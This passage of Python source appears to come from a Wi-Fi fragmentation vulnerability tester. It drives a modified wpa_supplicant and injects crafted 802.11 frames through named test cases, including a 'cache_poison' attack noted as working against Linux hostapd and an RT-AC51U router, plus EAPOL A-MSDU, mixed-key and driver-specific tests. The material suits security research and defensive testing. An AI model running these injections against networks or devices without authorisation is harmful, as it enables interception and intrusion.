			log(STATUS, "Received DHCP offer, sending DHCP request.")
			self.send_dhcp_request(p)
			self.dhcp_offer_frame = p

		# DHCP Ack
		elif req_type == 5:
			clientip = p[BOOTP].yiaddr
			serverip = p[IP].src
			self.time_retrans_dhcp = None
			log(STATUS, f"Received DHCP ack. My ip is {clientip} and router is {serverip}.", color="green")

			self.initialize_peermac(p.src)
			self.initialize_ips(clientip, serverip)

	def initialize_peermac(self, peermac):
		log(STATUS, f"Will now use peer MAC address {peermac} instead of the BSS")
		self.station.set_peermac(peermac)

	def initialize_ips(self, clientip, serverip):
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=clientip, ARP_addr=self.station.mac)
		self.station.set_ip_addresses(clientip, serverip)

	def handle_eth(self, p):
		if BOOTP in p and p[BOOTP].xid == self.dhcp_xid:
			self.handle_eth_dhcp(p)
		else:
			if self.arp_sock != None:
				self.arp_sock.reply(p)
			self.station.handle_eth(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "WPA: Key negotiation completed with" in msg:
			# This get's the current keys
			self.station.handle_authenticated()

		# Trying to authenticate with 38:2c:4a:c1:69:bc (SSID='backupnetwork2' freq=2462 MHz)
		elif "Trying to authenticate with" in msg:
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			bss = p.search(msg).group(1)
			self.station.handle_connecting(bss)

		elif "EAPOL-TX" in msg:
			cmd, srcaddr, payload = msg.split()
			self.station.handle_eapol_tx(bytes.fromhex(payload))

		# This event only occurs with WEP
		elif "WPA: EAPOL processing complete" in msg:
			self.station.handle_authenticated()

	def roam(self, station):
		log(STATUS, "Roaming to the current AP.", color="green")
		wpaspy_command(self.wpaspy_ctrl, "SET reassoc_same_bss_optim 0")
		wpaspy_command(self.wpaspy_ctrl, "ROAM " + station.bss)

	def reconnect(self, station):
		log(STATUS, "Reconnecting to the AP.", color="green")
		wpaspy_command(self.wpaspy_ctrl, "SET reassoc_same_bss_optim 1")
		wpaspy_command(self.wpaspy_ctrl, "REASSOCIATE")

	def configure_daemon(self):
		# TODO: Only enable networks once our script is ready, to prevent
		#	wpa_supplicant from connecting before our start started.

		# Optimize reassoc-to-same-BSS. This makes the "REASSOCIATE" command skip the
		# authentication phase (reducing the chance that packet queues are reset).
		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")

		# If the user already supplied IPs we can immediately perform tests
		if self.options.ip and self.options.peerip:
			self.initialize_ips(self.options.ip, self.options.peerip)

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.process = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf"] + log_level2switch())
			time.sleep(1)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")

# ----------------------------------- Main Function -----------------------------------

def cleanup():
	daemon.stop()

def char2trigger(c):
	if c == 'S': return Action.StartAuth
	elif c == 'B': return Action.BeforeAuth
	elif c == 'A': return Action.AfterAuth
	elif c == 'C': return Action.Connected
	else: raise Exception("Unknown trigger character " + c)

def stract2action(stract):
	if len(stract) == 1:
		trigger = Action.Connected
		c = stract[0]
	else:
		trigger = char2trigger(stract[0])
		c = stract[1]

	if c == 'I':
		return Action(trigger, action=Action.GetIp)
	elif c == 'R':
		return Action(trigger, action=Action.Rekey)
	elif c == 'P':
		return Action(trigger, enc=False)
	elif c == 'E':
		return Action(trigger, enc=True)

	raise Exception("Unrecognized action")

def prepare_tests(test_name, stractions, delay=0, inc_pn=0, as_msdu=False, ptype=None):
	if test_name == "ping":
		if stractions != None:
			actions = [stract2action(stract) for stract in stractions.split(",")]
		else:
			actions = [Action(Action.Connected, action=Action.GetIp),
				   Action(Action.Connected, enc=True)]

		test = PingTest(REQ_ICMP, actions, as_msdu=as_msdu)

	elif test_name == "ping_frag_sep":
		# Check if we can send frames in between fragments. Use priority of 1 since that
		# is also what we use in send_mon currently.
		separator = Dot11(type="Data", subtype=8, SC=(33 << 4) | 0)/Dot11QoS(TID=1)/LLC()/SNAP()
		test = PingTest(REQ_ICMP,
				[Action(Action.Connected, action=Action.GetIp),
				 Action(Action.Connected, enc=True),
				 Action(Action.Connected, enc=True)],
				 separate_with=separator, as_msdu=as_msdu,
				)

	elif test_name == "wep_mixed_key":
		log(WARNING, "Cannot predict WEP key reotation. Fragment may time out, use very short key rotation!", color="orange")
		test = PingTest(REQ_ICMP,
				[Action(Action.Connected, action=Action.GetIp),
				 Action(Action.Connected, enc=True),
				 # On a WEP key rotation we get a Connected event. So wait for that.
				 Action(Action.AfterAuth, enc=True),
				])

	elif test_name == "cache_poison":
		# Cache poison attack. Worked against Linux Hostapd and RT-AC51U.
		test = PingTest(REQ_ICMP,
				[Action(Action.Connected, enc=True),
				 Action(Action.Connected, action=Action.Reconnect),
				 Action(Action.AfterAuth, enc=True)])

	elif test_name == "eapol_msdu":
		if stractions != None:
			actions = [Action(char2trigger(t), enc=False) for t in stractions]
		else:
			actions = [Action(Action.StartAuth, enc=False),
				   Action(Action.StartAuth, enc=False)]

		test = EapolMsduTest(REQ_ICMP, actions)

	elif test_name == "linux_plain":
		test = LinuxTest(REQ_ICMP)

	elif test_name == "macos":
		if stractions != None:
			actions = [Action(char2trigger(t), enc=False) for t in stractions]
		else:
			actions = [Action(Action.StartAuth, enc=False),
				   Action(Action.StartAuth, enc=False)]

		test = MacOsTest(REQ_ICMP, actions)

	elif test_name == "qca_test":
		test = QcaDriverTest()

	elif test_name == "qca_split":
		test = QcaTestSplit()

	elif test_name == "qca_rekey":
		test = QcaDriverRekey()

	# -----------------------------------------------------------------------------------------

	elif test_name == "ping_bcast":
		# Check if the STA receives broadcast (useful test against AP)
		# XXX Have both broadcast and unicast IP/ARP inside?
		test = PingTest(REQ_DHCP,
				[Action(Action.Connected, enc=True)],
				bcast=True)

	# XXX TODO : Hardware decrypts it using old key, software using new key?
	#	     So right after rekey we inject first with old key, second with new key?

	# XXX TODO : What about extended functionality where we can have
	#	     two simultaneously pairwise keys?!?!

	# TODO:
	# - Test case to check if the receiver supports interleaved priority
	#   reception. It seems Windows 10 / Intel might not support this.
	# - Test case with a very lage aggregated frame (which is normally not
	#   allowed but some may accept it). And a variation to check how APs
	#   will forward such overly large frame (e.g. force fragmentation).
	# - [TKIP] Encrpted, Encrypted, no global MIC
	# - Plain/Enc tests but first plaintext sent before installing key
	# - Test fragmentation of management frames
	# - Test fragmentation of group frames (STA mode of RT-AC51u?)

	# If requested, override delay and inc_pn parameters in the test.
	test.set_options(delay, inc_pn)

	# If requested, override the ptype
	if ptype != None:
		if not hasattr(test, "ptype"):
			log(WARNING, "Cannot override request type of this test.")
			quit(1)
		test.ptype = ptype

	return test

def args2ptype(args):
	# Only one of these should be given
	if args.arp + args.dhcp + args.icmp > 1:
		log(STATUS, "You cannot combine --arp, --dhcp, or --icmp. Please only supply one of them.")
		quit(1)

	if args.arp: return REQ_ARP
	if args.dhcp: return REQ_DHCP
	if args.icmp: return REQ_ICMP

	return None

if __name__ == "__main__":
	log(WARNING, "Remember to use a modified backports and ath9k_htc firmware!\n")

	parser = argparse.ArgumentParser(description="Test for fragmentation vulnerabilities.")
	parser.add_argument('iface', help="Interface to use for the tests.")
	parser.add_argument('testname', help="Name or identifier of the test to run.")
	parser.add_argument('actions', nargs='?', help="Optional textual descriptions of actions")
	parser.add_argument('--ip', help="IP we as a sender should use.")
	parser.add_argument('--peerip', help="IP of the device we will test.")
	parser.add_argument('--ap', default=False, action='store_true', help="Act as an AP to test clients.")
	parser.add_argument('--debug', type=int, default=0, help="Debug output level.")
	parser.add_argument('--delay', type=int, default=0, help="Delay between fragments in certain tests.")
	parser.add_argument('--inc_pn', type=int, default=1, help="To test non-sequential packet number in fragments.")
	parser.add_argument('--msdu', default=False, action='store_true', help="Encapsulate pings in an A-MSDU frame.")
	parser.add_argument('--arp', default=False, action='store_true', help="Override default request with ARP request.")
	parser.add_argument('--dhcp', default=False, action='store_true', help="Override default request with DHCP discover.")
	parser.add_argument('--icmp', default=False, action='store_true', help="Override default request with ICMP ping request.")
	args = parser.parse_args()

	ptype = args2ptype(args)

	# Convert parsed options to TestOptions object
	options = TestOptions()
	options.interface = args.iface
	options.test = prepare_tests(args.testname, args.actions, args.delay, args.inc_pn, args.msdu, ptype)
	options.ip = args.ip
	options.peerip = args.peerip

	# Parse remaining options
	global_log_level -= args.debug

	# Now start the tests --- TODO: Inject Deauths before connecting with client...
	if args.ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()
